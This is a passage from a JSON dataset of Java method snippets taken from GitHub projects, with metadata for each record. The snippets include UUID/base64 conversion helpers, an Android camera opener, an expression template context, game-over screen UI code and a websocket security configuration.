break;\n            case '7':\n                binary = \"0111\";\n                break;\n            case '8':\n                binary = \"1000\";\n                break;\n            case '9':\n                binary = \"1001\";\n                break;\n            case 'A':\n                binary = \"1010\";\n                break;\n            case 'B':\n                binary = \"1011\";\n                break;\n            case 'C':\n                binary = \"1100\";\n                break;\n            case 'D':\n                binary = \"1101\";\n                break;\n            case 'E':\n                binary = \"1110\";\n                break;\n            case 'F':\n                binary = \"1111\";\n                break;\n            default:\n                binary = \"\";\n        }\n        return binary;\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-common/src/main/java/com/kingge/rtm/utils/UUID64.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57687, "method_name": "binaryTo64", "class_name": "UUID64", "params": ["String"], "throws": null, "modifiers": ["static"], "return_type": "String", "snippet": "    static String binaryTo64(String binary) {\n        StringBuffer sb = new StringBuffer();\n        if (binary == null || \"\".equals(binary))\n            return \"\";\n        if ((binary.length() % 6) != 0)\n            return \"\";\n        for (int i = 0; i < binary.length(); i += 6) {\n            sb.append(binaryTo64a(binary.substring(i, i + 6)));\n        }\n        return sb.toString();\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-common/src/main/java/com/kingge/rtm/utils/UUID64.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57688, "method_name": "binaryTo64a", "class_name": "UUID64", "params": ["String"], "throws": null, "modifiers": ["static"], "return_type": "String", "snippet": "    static String binaryTo64a(String binary) {\n        String result = null;\n        if (\"000000\".equals(binary)) {\n            result = \"0\";\n        } else if (\"000001\".equals(binary)) {\n            result = \"1\";\n        } else if (\"000010\".equals(binary)) {\n            result = \"2\";\n        } else if (\"000011\".equals(binary)) {\n            result = \"3\";\n        } else if (\"000100\".equals(binary)) {\n            result = \"4\";\n        } else if (\"000101\".equals(binary)) {\n            result = \"5\";\n        } else if (\"000110\".equals(binary)) {\n            result = \"6\";\n        } else if (\"000111\".equals(binary)) {\n            result = \"7\";\n        } else if (\"001000\".equals(binary)) {\n            result = \"8\";\n        } else if (\"001001\".equals(binary)) {\n            result = \"9\";\n        } else if (\"001010\".equals(binary)) {\n            result = \"a\";\n        } else if (\"001011\".equals(binary)) {\n            result = \"b\";\n        } else if (\"001100\".equals(binary)) {\n            result = \"c\";\n        } else if (\"001101\".equals(binary)) {\n            result = \"d\";\n        } else if (\"001110\".equals(binary)) {\n            result = \"e\";\n        } else if (\"001111\".equals(binary)) {\n            result = \"f\";\n        } else if (\"010000\".equals(binary)) {\n            result = \"g\";\n        } else if (\"010001\".equals(binary)) {\n            result = \"h\";\n        } else if (\"010010\".equals(binary)) {\n            result = \"i\";\n        } else if (\"010011\".equals(binary)) {\n            result = \"j\";\n        } else if (\"010100\".equals(binary)) {\n            result = \"k\";\n        } else if (\"010101\".equals(binary)) {\n            result = \"l\";\n        } else if (\"010110\".equals(binary)) {\n            result = \"m\";\n        } else if (\"010111\".equals(binary)) {\n            result = \"n\";\n        } else if (\"011000\".equals(binary)) {\n            result = \"o\";\n        } else if (\"011001\".equals(binary)) {\n            result = \"p\";\n        } else if (\"011010\".equals(binary)) {\n            result = \"q\";\n        } else if (\"011011\".equals(binary)) {\n            result = \"r\";\n        } else if (\"011100\".equals(binary)) {\n            result = \"s\";\n        } else if (\"011101\".equals(binary)) {\n            result = \"t\";\n        } else if (\"011110\".equals(binary)) {\n            result = \"u\";\n        } else if (\"011111\".equals(binary)) {\n            result = \"v\";\n        } else if (\"100000\".equals(binary)) {\n            result = \"w\";\n        } else if (\"100001\".equals(binary)) {\n            result = \"x\";\n        } else if (\"100010\".equals(binary)) {\n            result = \"y\";\n        } else if (\"100011\".equals(binary)) {\n            result = \"z\";\n        } else if (\"100100\".equals(binary)) {\n            result = \"A\";\n        } else if (\"100101\".equals(binary)) {\n            result = \"B\";\n        } else if (\"100110\".equals(binary)) {\n            result = \"C\";\n        } else if (\"100111\".equals(binary)) {\n            result = \"D\";\n        } else if (\"101000\".equals(binary)) {\n            result = \"E\";\n        } else if (\"101001\".equals(binary)) {\n            result = \"F\";\n        } else if (\"101010\".equals(binary)) {\n            result = \"G\";\n        } else if (\"101011\".equals(binary)) {\n            result = \"H\";\n        } else if (\"101100\".equals(binary)) {\n            result = \"I\";\n        } else if (\"101101\".equals(binary)) {\n            result = \"J\";\n        } else if (\"101110\".equals(binary)) {\n            result = \"K\";\n        } else if (\"101111\".equals(binary)) {\n            result = \"L\";\n        } else if (\"110000\".equals(binary)) {\n            result = \"M\";\n        } else if (\"110001\".equals(binary)) {\n            result = \"N\";\n        } else if (\"110010\".equals(binary)) {\n            result = \"O\";\n        } else if (\"110011\".equals(binary)) {\n            result = \"P\";\n        } else if (\"110100\".equals(binary)) {\n            result = \"Q\";\n        } else if (\"110101\".equals(binary)) {\n            result = \"R\";\n        } else if (\"110110\".equals(binary)) {\n            result = \"S\";\n        } else if (\"110111\".equals(binary)) {\n            result = \"T\";\n        } else if (\"111000\".equals(binary)) {\n            result = \"U\";\n        } else if (\"111001\".equals(binary)) {\n            result = \"V\";\n        } else if (\"111010\".equals(binary)) {\n            result = \"W\";\n        } else if (\"111011\".equals(binary)) {\n            result = \"X\";\n        } else if (\"111100\".equals(binary)) {\n            result = \"Y\";\n        } else if (\"111101\".equals(binary)) {\n            result = \"Z\";\n        } else if (\"111110\".equals(binary)) {\n            result = \"_\";\n        } else if (\"111111\".equals(binary)) {\n            result = \"-\";\n        } else {\n            result = \"\";\n        }\n        return result;\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-common/src/main/java/com/kingge/rtm/utils/UUID64.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57689, "method_name": "getCurrentTime", "class_name": "PlaybackProgressChangedEvent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getCurrentTime() {\n        return currentTime;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/events/PlaybackProgressChangedEvent.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57690, "method_name": "getDuration", "class_name": "PlaybackProgressChangedEvent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getDuration() {\n        return duration;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/events/PlaybackProgressChangedEvent.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57691, "method_name": "open", "class_name": "OpenCameraInterface", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "Camera", "snippet": "    public static Camera open(int cameraId) {\n\n        int numCameras = Camera.getNumberOfCameras();\n        if (numCameras == 0) {\n            Log.w(TAG, \"No cameras!\");\n            return null;\n        }\n\n        boolean explicitRequest = cameraId >= 0;\n\n        if (!explicitRequest) {\n            // Select a camera if no explicit camera requested\n            int index = 0;\n            while (index < numCameras) {\n                Camera.CameraInfo cameraInfo = new Camera.CameraInfo();\n                Camera.getCameraInfo(index, cameraInfo);\n                if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {\n                    break;\n                }\n                index++;\n            }\n\n            cameraId = index;\n        }\n\n        Camera camera;\n        if (cameraId < numCameras) {\n            Log.i(TAG, \"Opening camera #\" + cameraId);\n            camera = Camera.open(cameraId);\n        } else {\n            if (explicitRequest) {\n                Log.w(TAG, \"Requested camera does not exist: \" + cameraId);\n                camera = null;\n            } else {\n                Log.i(TAG, \"No camera facing back; returning camera #0\");\n                camera = Camera.open(0);\n            }\n        }\n\n        return camera;\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/scan/camera/OpenCameraInterface.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 57692, "method_name": "open", "class_name": "OpenCameraInterface", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "Camera", "snippet": "    public static Camera open() {\n        return open(-1);\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/scan/camera/OpenCameraInterface.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 57693, "method_name": "get", "class_name": "ExpressionTemplateContext", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "ExpressionTemplateContext", "snippet": "\tpublic static ExpressionTemplateContext get(){\n\t\treturn CONTEXT_THREAD_LOCAL.get();\n\t}", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/expression/ExpressionTemplateContext.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57694, "method_name": "remove", "class_name": "ExpressionTemplateContext", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void remove(){\n\t\tCONTEXT_THREAD_LOCAL.remove();\n\t}", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/expression/ExpressionTemplateContext.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57695, "method_name": "set", "class_name": "ExpressionTemplateContext", "params": ["ExpressionTemplateContext"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void set(ExpressionTemplateContext context){\n\t\tCONTEXT_THREAD_LOCAL.set(context);\n\t}", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/expression/ExpressionTemplateContext.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57696, "method_name": "set", "class_name": "ExpressionTemplateContext", "params": ["String", "Object"], "throws": null, "modifiers": ["public"], "return_type": "ExpressionTemplateContext", "snippet": "\tpublic ExpressionTemplateContext set (String name, Object value) {\n\t\tfor (int i = scopes.size() - 1; i >= 0; i--) {\n\t\t\tMap<String, Object> ctx = scopes.get(i);\n\t\t\tif (ctx.isEmpty()) {\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tif (ctx.containsKey(name)) {\n\t\t\t\tctx.put(name, value);\n\t\t\t\treturn this;\n\t\t\t}\n\t\t}\n\n\t\tscopes.get(scopes.size() - 1).put(name, value);\n\t\treturn this;\n\t}", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/expression/ExpressionTemplateContext.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57697, "method_name": "setOnCurrentScope", "class_name": "ExpressionTemplateContext", "params": ["String", "Object"], "throws": null, "modifiers": ["public"], "return_type": "ExpressionTemplateContext", "snippet": "\tpublic ExpressionTemplateContext setOnCurrentScope (String name, Object value) {\n\t\tscopes.get(scopes.size() - 1).put(name, value);\n\t\treturn this;\n\t}", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/expression/ExpressionTemplateContext.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57698, "method_name": "get", "class_name": "ExpressionTemplateContext", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "\tpublic Object get (String name) {\n\t\tfor (int i = scopes.size() - 1; i >= 0; i--) {\n\t\t\tMap<String, Object> ctx = scopes.get(i);\n\t\t\tif (ctx.isEmpty()) {\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tObject value = ctx.get(name);\n\t\t\tif (value != null) {\n\t\t\t\treturn value;\n\t\t\t}\n\t\t}\n\t\treturn null;\n\t}", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/expression/ExpressionTemplateContext.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57699, "method_name": "getVariables", "class_name": "ExpressionTemplateContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Set<String>", "snippet": "\tpublic Set<String> getVariables () {\n\t\tSet<String> variables = new HashSet<String>();\n\t\tfor (int i = 0, n = scopes.size(); i < n; i++) {\n\t\t\tvariables.addAll(scopes.get(i).keySet());\n\t\t}\n\t\treturn variables;\n\t}", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/expression/ExpressionTemplateContext.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57700, "method_name": "push", "class_name": "ExpressionTemplateContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void push () {\n\t\tMap<String, Object> newScope = freeScopes.size() > 0 ? freeScopes.remove(freeScopes.size() - 1) : new HashMap<String, Object>();\n\t\tscopes.add(newScope);\n\t}", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/expression/ExpressionTemplateContext.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57701, "method_name": "pop", "class_name": "ExpressionTemplateContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void pop () {\n\t\tMap<String, Object> oldScope = scopes.remove(scopes.size() - 1);\n\t\toldScope.clear();\n\t\tfreeScopes.add(oldScope);\n\t}", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/expression/ExpressionTemplateContext.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57702, "method_name": "init0", "class_name": "GameOverUI", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void init0() {\n        setBackground(Color.black);\n        addMouseListener(this);\n        addMouseMotionListener(this);\n        \n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/game/GameOverUI.java", "stars": "74", "class_props": {"extends": "FadeInPanel", "implements": ["MouseListener", "MouseMotionListener", "ActionListener"], "modifiers": ["final", "public"]}}, {"id": 57703, "method_name": "textFinished", "class_name": "GameOverUI", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean textFinished()  { return transIndex >= (trans.length -1); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/game/GameOverUI.java", "stars": "74", "class_props": {"extends": "FadeInPanel", "implements": ["MouseListener", "MouseMotionListener", "ActionListener"], "modifiers": ["final", "public"]}}, {"id": 57704, "method_name": "fadeInMs", "class_name": "GameOverUI", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int fadeInMs()        { return 2000; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/game/GameOverUI.java", "stars": "74", "class_props": {"extends": "FadeInPanel", "implements": ["MouseListener", "MouseMotionListener", "ActionListener"], "modifiers": ["final", "public"]}}, {"id": 57705, "method_name": "init", "class_name": "GameOverUI", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void init() {\n        startFadeTimer();\n        Race r = player().race();\n        Image gameOverImage = session().status().lost() ? image(r.lossSplashKey) : image(r.winSplashKey);\n        \n        if (gameOverImage == null) {\n            backImg = GalaxyMapPanel.sharedStarBackground;\n            fadeDelay = 1000;\n        }\n        else {\n            backImg = newBufferedImage(gameOverImage);\n            fadeDelay = 3000;\n        }\n            \n        if (trans == null) {\n            trans = new Composite[20];\n            for (int i=0;i<trans.length;i++) \n                trans[i]  = AlphaComposite.getInstance(AlphaComposite.SRC_OVER, (float)i/trans.length);\n        }\n        transIndex = -1;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/game/GameOverUI.java", "stars": "74", "class_props": {"extends": "FadeInPanel", "implements": ["MouseListener", "MouseMotionListener", "ActionListener"], "modifiers": ["final", "public"]}}, {"id": 57706, "method_name": "paintComponent", "class_name": "GameOverUI", "params": ["Graphics"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void paintComponent(Graphics g) {\n        super.paintComponent(g);\n        drawEndingScene(screenBuffer()); \n        g.drawImage(screenBuffer(),0,0,null);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/game/GameOverUI.java", "stars": "74", "class_props": {"extends": "FadeInPanel", "implements": ["MouseListener", "MouseMotionListener", "ActionListener"], "modifiers": ["final", "public"]}}, {"id": 57707, "method_name": "drawEndingScene", "class_name": "GameOverUI", "params": ["Image"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void drawEndingScene(Image img) {\n        long t0 = System.currentTimeMillis();\n        int w = getWidth();\n        int h = getHeight();\n        Graphics2D g = (Graphics2D) img.getGraphics();\n        setFontHints(g);\n\n        g.drawImage(backImg, 0, 0, w, h, null);\n\n        g.setFont(narrowFont(30));\n        g.setColor(Color.lightGray);\n        String title = gameOverTitle();\n        g.drawString(title, s10, s35);\n        String score = text(\"GAME_OVER_FINAL_SCORE\", session().status().finalScore());\n        int sw0 = g.getFontMetrics().stringWidth(score);\n        g.drawString(score, w-sw0-s30, s35);\n        \n        if (transIndex >= 0) {\n            int lineH = s30;\n            int lineW = w*2/3;\n            g.setFont(font(26));\n            List<String> paragraphs = substrings(gameOverText(), '#');\n            List<String> lines = new ArrayList<>();\n            for (String para : paragraphs) {\n                lines.addAll(wrappedLines(g, para, lineW));\n                lines.add(\"\");\n            }\n            int textBoxH = lineH*(lines.size()+1);\n            int y0 = (h-textBoxH)/ 2;\n            int x0 = (w-lineW)/2;\n            Composite preComp = g.getComposite();\n            g.setComposite(trans[transIndex]);\n            g.setColor(new Color(0,0,0,128));\n            g.fillRect(x0-s20, y0, lineW+s30, textBoxH);\n\n            g.setColor(Color.lightGray);\n            y0 += lineH;\n            for (String line : lines) {\n                y0 += lineH;\n                //int sw = g.getFontMetrics().stringWidth(line);\n                // only draw text border when fade-in is complete\n                if (transIndex == trans.length-1) \n                    drawBorderedString(g, line, x0, y0, Color.black, Color.lightGray);\n                else\n                    g.drawString(line, x0, y0);\n            }\n            g.setComposite(preComp);\n        }\n        if (textFinished())\n            drawSkipText(g, true);\n\n        drawOverlay(g);\n        \n        // fade in the descriptive text\n        if (!stillFading() && (transIndex < trans.length -1)) {\n            // on the first time through (transIndex = -1)\n            // wait 3 seconds to let the background image linger\n            // before fading in text over it\n            if (transIndex < 0) {\n                sleep(fadeDelay);\n                transIndex = 0;\n            }\n            transIndex = Math.min(transIndex+1, trans.length-1);\n            int dur = (int) min(200, System.currentTimeMillis() - t0);\n            sleep(200-dur);\n            repaint();\n            return;\n        }\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/game/GameOverUI.java", "stars": "74", "class_props": {"extends": "FadeInPanel", "implements": ["MouseListener", "MouseMotionListener", "ActionListener"], "modifiers": ["final", "public"]}}, {"id": 57708, "method_name": "gameOverTitle", "class_name": "GameOverUI", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String gameOverTitle() {\n        if (session().status().lostOverthrown())\n            return text(\"GAME_OVER_OVERTHROWN_LOSS\");\n        else if (session().status().lostMilitary())\n            return text(\"GAME_OVER_MILITARY_LOSS\");\n        else if (session().status().lostDiplomatic())\n            return text(\"GAME_OVER_DIPLOMATIC_LOSS\");\n        else if (session().status().lostNewRepublic())\n            return text(\"GAME_OVER_NEW_REPUBLIC_LOSS\");\n        else if (session().status().lostRebellion())\n            return text(\"GAME_OVER_REBELLION_LOSS\");\n        else if (session().status().wonDiplomatic())\n            return text(\"GAME_OVER_DIPLOMATIC_WIN\");\n        else if (session().status().wonMilitary())\n            return text(\"GAME_OVER_MILITARY_WIN\");\n        else if (session().status().wonMilitaryAlliance())\n            return text(\"GAME_OVER_MILITARY_ALLIANCE_WIN\");\n        else if (session().status().wonNewRepublic())\n            return text(\"GAME_OVER_NEW_REPUBLIC_WIN\");\n        else if (session().status().wonRebellion())\n            return text(\"GAME_OVER_REBELLION_WIN\");\n        else if (session().status().wonCouncilAlliance())\n            return text(\"GAME_OVER_ALLIANCE_WIN\");\n        else if (session().status().wonRebellionAlliance())\n            return text(\"GAME_OVER_REBEL_ALLIANCE_WIN\");\n\n        return \"\";\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/game/GameOverUI.java", "stars": "74", "class_props": {"extends": "FadeInPanel", "implements": ["MouseListener", "MouseMotionListener", "ActionListener"], "modifiers": ["final", "public"]}}, {"id": 57709, "method_name": "gameOverText", "class_name": "GameOverUI", "params": [], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String gameOverText() {\n        Empire pl = player();\n        String year = str(galaxy().currentYear());\n        String pName = pl.leader().name();\n        String pRace = pl.raceName();\n        String pEmpire = pl.name();\n        Empire ruler = galaxy().council().leader();\n        String rName = ruler == null ? \"\" : ruler.leader().name();\n        String rRace = ruler == null ? \"\" : ruler.raceName();\n        String rEmpire = ruler == null ? \"\" :ruler.label(\"_race_plural\");\n\n        if (session().status().lostOverthrown())\n            return text(\"GAME_OVER_OVERTHROWN_LOSS2\", year, pName, pRace, pEmpire, rName, rRace, rEmpire);\n        else if (session().status().lostMilitary())\n            return text(\"GAME_OVER_MILITARY_LOSS2\", year, pName, pRace, pEmpire, rName, rRace, rEmpire);\n        else if (session().status().lostDiplomatic())\n            return text(\"GAME_OVER_DIPLOMATIC_LOSS2\", year, pName, pRace, pEmpire, rName, rRace, rEmpire);\n        else if (session().status().lostNewRepublic())\n            return text(\"GAME_OVER_NEW_REPUBLIC_LOSS2\", year, pName, pRace, pEmpire, rName, rRace, rEmpire);\n        else if (session().status().lostRebellion()) {\n            String special = ruler.text(\"GAME_OVER_REBELLION_LOSS3\");\n            return text(\"GAME_OVER_REBELLION_LOSS2\", year, pName, pRace, pEmpire, rName, rRace, rEmpire, special);\n        }\n        else if (session().status().wonDiplomatic())\n            return text(\"GAME_OVER_DIPLOMATIC_WIN2\", year, pName, pRace, pEmpire, rName, rRace, rEmpire);\n        else if (session().status().wonMilitary())\n            return text(\"GAME_OVER_MILITARY_WIN2\", year, pName, pRace, pEmpire, rName, rRace, rEmpire);\n        else if (session().status().wonMilitaryAlliance()) \n            return text(\"GAME_OVER_MILITARY_ALLIANCE_WIN2\", year, pName, pRace, pEmpire, rName, rRace, rEmpire);\n        else if (session().status().wonNewRepublic())\n            return text(\"GAME_OVER_NEW_REPUBLIC_WIN2\", year, pName, pRace, pEmpire, rName, rRace, rEmpire);\n        else if (session().status().wonRebellion())\n            return text(\"GAME_OVER_REBELLION_WIN2\", year, pName, pRace, pEmpire, rName, rRace, rEmpire);\n        else if (session().status().wonCouncilAlliance()) {\n            String special = ruler.text(\"GAME_OVER_ALLIANCE_WIN3\");\n            return text(\"GAME_OVER_ALLIANCE_WIN2\", year, pName, pRace, pEmpire, rName, rRace, rEmpire, special);\n        }\n        else if (session().status().wonRebellionAlliance())\n            return text(\"GAME_OVER_REBEL_ALLIANCE_WIN2\", year, pName, pRace, pEmpire, rName, rRace, rEmpire);\n\n        return \"\";\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/game/GameOverUI.java", "stars": "74", "class_props": {"extends": "FadeInPanel", "implements": ["MouseListener", "MouseMotionListener", "ActionListener"], "modifiers": ["final", "public"]}}, {"id": 57710, "method_name": "advanceMode", "class_name": "GameOverUI", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void advanceMode() {\n        stopAmbience();\n        RotPUI.instance().selectGamePanel();\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/game/GameOverUI.java", "stars": "74", "class_props": {"extends": "FadeInPanel", "implements": ["MouseListener", "MouseMotionListener", "ActionListener"], "modifiers": ["final", "public"]}}, {"id": 57711, "method_name": "animate", "class_name": "GameOverUI", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void animate() {\n        advanceFade();\n\n        repaint();\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/game/GameOverUI.java", "stars": "74", "class_props": {"extends": "FadeInPanel", "implements": ["MouseListener", "MouseMotionListener", "ActionListener"], "modifiers": ["final", "public"]}}, {"id": 57712, "method_name": "ambienceSoundKey", "class_name": "GameOverUI", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String ambienceSoundKey() { \n        if (session().status().won())\n            return \"VictoryAmbience\";\n        else if (session().status().lost())\n            return \"DefeatAmbience\";\n        else\n            return \"\";\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/game/GameOverUI.java", "stars": "74", "class_props": {"extends": "FadeInPanel", "implements": ["MouseListener", "MouseMotionListener", "ActionListener"], "modifiers": ["final", "public"]}}, {"id": 57713, "method_name": "mouseDragged", "class_name": "GameOverUI", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void mouseDragged(MouseEvent e) { }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/game/GameOverUI.java", "stars": "74", "class_props": {"extends": "FadeInPanel", "implements": ["MouseListener", "MouseMotionListener", "ActionListener"], "modifiers": ["final", "public"]}}, {"id": 57714, "method_name": "mouseMoved", "class_name": "GameOverUI", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void mouseMoved(MouseEvent e) { }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/game/GameOverUI.java", "stars": "74", "class_props": {"extends": "FadeInPanel", "implements": ["MouseListener", "MouseMotionListener", "ActionListener"], "modifiers": ["final", "public"]}}, {"id": 57715, "method_name": "mouseClicked", "class_name": "GameOverUI", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void mouseClicked(MouseEvent arg0) { }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/game/GameOverUI.java", "stars": "74", "class_props": {"extends": "FadeInPanel", "implements": ["MouseListener", "MouseMotionListener", "ActionListener"], "modifiers": ["final", "public"]}}, {"id": 57716, "method_name": "mouseEntered", "class_name": "GameOverUI", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void mouseEntered(MouseEvent arg0) { }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/game/GameOverUI.java", "stars": "74", "class_props": {"extends": "FadeInPanel", "implements": ["MouseListener", "MouseMotionListener", "ActionListener"], "modifiers": ["final", "public"]}}, {"id": 57717, "method_name": "mouseExited", "class_name": "GameOverUI", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void mouseExited(MouseEvent arg0) { }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/game/GameOverUI.java", "stars": "74", "class_props": {"extends": "FadeInPanel", "implements": ["MouseListener", "MouseMotionListener", "ActionListener"], "modifiers": ["final", "public"]}}, {"id": 57718, "method_name": "mousePressed", "class_name": "GameOverUI", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void mousePressed(MouseEvent arg0) {}", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/game/GameOverUI.java", "stars": "74", "class_props": {"extends": "FadeInPanel", "implements": ["MouseListener", "MouseMotionListener", "ActionListener"], "modifiers": ["final", "public"]}}, {"id": 57719, "method_name": "mouseReleased", "class_name": "GameOverUI", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void mouseReleased(MouseEvent e) { \n        if (e.getButton() > 3)\n            return;\n        if (!textFinished())\n            return;\n        advanceMode();\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/game/GameOverUI.java", "stars": "74", "class_props": {"extends": "FadeInPanel", "implements": ["MouseListener", "MouseMotionListener", "ActionListener"], "modifiers": ["final", "public"]}}, {"id": 57720, "method_name": "keyPressed", "class_name": "GameOverUI", "params": ["KeyEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void keyPressed(KeyEvent e) {\n        if (!textFinished())\n            return;\n\n        switch(e.getKeyCode()) {\n            case KeyEvent.VK_ESCAPE:\n                advanceMode();\n                return;\n        }\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/game/GameOverUI.java", "stars": "74", "class_props": {"extends": "FadeInPanel", "implements": ["MouseListener", "MouseMotionListener", "ActionListener"], "modifiers": ["final", "public"]}}, {"id": 57721, "method_name": "configureInbound", "class_name": "WebsocketSecurityConfiguration", "params": ["MessageSecurityMetadataSourceRegistry"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void configureInbound(MessageSecurityMetadataSourceRegistry messages) {\n        messages\n            .nullDestMatcher().authenticated()\n            .simpDestMatchers(\"/topic/tracker\").hasAuthority(AuthoritiesConstants.ADMIN)\n            // matches any destination that starts with /topic/\n            // (i.e. cannot send messages directly to /topic/)\n            // (i.e. cannot subscribe to /topic/messages/* to get messages sent to\n            // /topic/messages-user<id>)\n            .simpDestMatchers(\"/topic/**\").authenticated()\n            // message types other than MESSAGE and SUBSCRIBE\n            .simpTypeMatchers(SimpMessageType.MESSAGE, SimpMessageType.SUBSCRIBE).denyAll()\n            // catch all\n            .anyMessage().denyAll();\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/config/WebsocketSecurityConfiguration.java", "stars": "2", "class_props": {"extends": "AbstractSecurityWebSocketMessageBrokerConfigurer", "implements": null, "modifiers": ["public"]}}, {"id": 